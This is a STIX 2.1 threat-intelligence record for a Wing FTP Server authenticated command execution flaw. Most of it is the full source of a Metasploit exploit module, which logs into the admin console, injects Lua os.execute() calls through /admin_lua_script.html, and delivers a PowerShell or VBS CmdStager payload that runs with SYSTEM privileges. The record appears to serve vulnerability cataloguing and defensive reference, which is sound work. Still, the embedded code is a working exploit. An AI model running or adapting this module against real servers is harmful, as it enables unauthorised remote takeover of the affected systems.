{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--32a6b34f-5423-4f1b-86bc-b89e2ed803c1",
    "created": "2024-08-14T16:51:12.85734Z",
    "modified": "2024-08-14T16:51:12.857344Z",
    "name": "Wing FTP Server Authenticated Command Execution",
    "description": " This module exploits the embedded Lua interpreter in the admin web interface for versions 3.0.0 and above. When supplying a specially crafted HTTP POST request an attacker can use os.execute() to execute arbitrary system commands on the target with SYSTEM privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/wing_ftp_admin_exec.rb",
            "external_id": "wing_ftp_admin_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.wftpserver.com"
        },
        {
            "source_name": "reference",
            "url": "https://www.wftpserver.com/help/ftpserver/index.html?administrator_console.htm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wing FTP Server Authenticated Command Execution',\n      'Description'    => %q{\n        This module exploits the embedded Lua interpreter in the admin web interface for\n        versions 3.0.0 and above. When supplying a specially crafted HTTP POST request\n        an attacker can use os.execute() to execute arbitrary system commands on\n        the target with SYSTEM privileges.\n      },\n      'Author'         =>\n        [\n          'Nicholas Nam <nick[at]executionflow.org>',\n          'Imran E. Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' # minor improvements\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://www.wftpserver.com'],\n          ['URL', 'https://www.wftpserver.com/help/ftpserver/index.html?administrator_console.htm']\n        ],\n      'Arch'           => ARCH_X86,\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Wing FTP Server >= 3.0.0', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2014-06-19',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(5466),\n        OptString.new('USERNAME', [true, 'Admin username', '']),\n        OptString.new('PASSWORD', [true, 'Admin password', ''])\n      ], self.class\n    )\n    deregister_options('CMDSTAGER::FLAVOR')\n    deregister_options('CMDSTAGER::DECODER')\n    deregister_options('URIPATH')\n    deregister_options('SRVHOST')\n    deregister_options('SRVPORT')\n  end\n\n  @session_cookie = ''\n  @version = ''\n  @psh = false\n  @vuln_check = false\n\n  def check\n    @session_cookie = authenticate(datastore['USERNAME'], datastore['PASSWORD'])\n    if @session_cookie.nil?\n      return CheckCode::Unknown\n    end\n\n    ver = send_request_cgi(\n      'uri'       => '/admin_license.html',\n      'method'    => 'POST',\n      'cookie'    => @session_cookie,\n      'ctype'     => 'text/plain;charset=UTF-8'\n    )\n\n    unless ver\n      vprint_error(\"Connection failed!\")\n      return CheckCode::Unknown\n    end\n\n    unless ver.code == 200 && ver.body.include?('Wing FTP Server')\n      return CheckCode::Safe\n    end\n\n    @version = Rex::Version.new(ver.body.scan(/Wing FTP Server ([\\d\\.]+)/).flatten.first)\n    print_status(\"Found Wing FTP Server #{@version}\")\n\n    # Lua capabilities and administrator console were added in version 3.0.0, so everything above that is (probably) vulnerable\n    unless @version >= Rex::Version.new('3.0.0')\n      @vuln_check = false\n      return CheckCode::Safe\n    end\n\n    @vuln_check = true\n    winenv_path = execute_command(\"PATH\")\n\n    unless winenv_path\n      vprint_error(\"Connection failed!\")\n      return CheckCode::Unknown\n    end\n\n    if winenv_path.code == 200\n      winenv_path.body.split(';').each do |path_val|\n        if (/powershell/i) =~ path_val\n          print_good(\"Found Powershell at #{path_val}\")\n          @psh = true\n        end\n      end\n    else\n      @psh = false\n    end\n\n    @vuln_check = false\n    return CheckCode::Vulnerable\n  end\n\n  def exploit\n    vprint_status(\"Authenticating...\")\n    unless [CheckCode::Vulnerable].include? check\n      fail_with(Failure::NotVulnerable, 'Target is most likely not vulnerable!')\n    end\n\n    if @psh == true\n      print_status('Executing payload via PowerShell...')\n      psh_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true)\n      execute_command(psh_command)\n    else\n      if @version > Rex::Version.new('4.3.8')\n        fail_with(Failure::NoTarget, \"Version #{@version} detected and PowerShell not found, aborting exploit attempt!\")\n      end\n      print_warning(\"PowerShell not found, will revert to CmdStager for payload delivery!\")\n      print_status(\"Sending payload...\")\n      # Execute the CmdStager, max length of the commands is ~1500\n      execute_cmdstager(flavor: :vbs, linemax: 1500)\n    end\n  end\n\n  def execute_command(cmd,_opts = {})\n    # Wrap cmd with [[ ]] to prevent potential problems.\n    if @vuln_check == true\n      command = \"print(os.getenv([[#{cmd}]]))\"\n    else\n      command = \"os.execute([[#{cmd}]])\"\n    end\n\n    res = send_request_cgi(\n      'uri'       \t\t=> '/admin_lua_script.html',\n      'method'    \t\t=> 'POST',\n      'encode_params' => true,\n      'cookie'    \t\t=> @session_cookie,\n      'ctype'     \t\t=> 'text/plain;charset=UTF-8',\n      'vars_post' \t\t=> { 'command' => command }\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Something went wrong.\")\n    end\n\n    if @vuln_check\n      return res\n    end\n  end\n\n  def authenticate(username, password)\n    res = send_request_cgi(\n      'uri'       => '/admin_loginok.html',\n      'method'    => 'POST',\n      'vars_post' => {\n        'username'     => username,\n        'password'     => password,\n        'username_val' => username,\n        'password_val' => password,\n        'submit_btn'   => '+Login+'\n      }\n    )\n\n    unless res\n      print_error(\"#{peer} - Admin login page was unreachable.\")\n      return nil\n    end\n\n    if res.code == 200 && res.body =~ /location='main.html\\?lang=english';/\n      res.get_cookies.split(';').each do |cookie|\n        cookie.split(',').each do |value|\n          if value.split('=')[0] =~ /UIDADMIN/\n            vprint_good(\"Authentication successful, got session cookie #{value.split('=')[1]}\")\n            return res.get_cookies.split(';')[0]\n          end\n        end\n      end\n    end\n\n    print_error(\"#{peer} - Authentication failed!\")\n    return nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-06-19",
    "x_mitre_platforms": [
        "win'"
    ]
}